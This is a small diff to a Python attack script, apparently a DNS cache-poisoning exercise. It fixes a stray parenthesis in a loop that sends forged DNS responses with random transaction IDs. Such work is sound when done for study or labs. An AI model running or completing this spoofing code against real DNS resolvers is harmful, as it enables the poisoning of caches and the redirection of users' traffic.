@@ -82,7 +82,7 @@ def attack():
         for i in range(60):
             fake_response[DNS].id = getRandomTXID()
             print "TXID = %s" % str(fake_response[DNS].id)
-            sock.sendto(bytes(fake_response), (my_ip, query_port)))
+            sock.sendto(bytes(fake_response), (my_ip, query_port))
 
         # check to see if it worked
         data = sock.recv(1024)
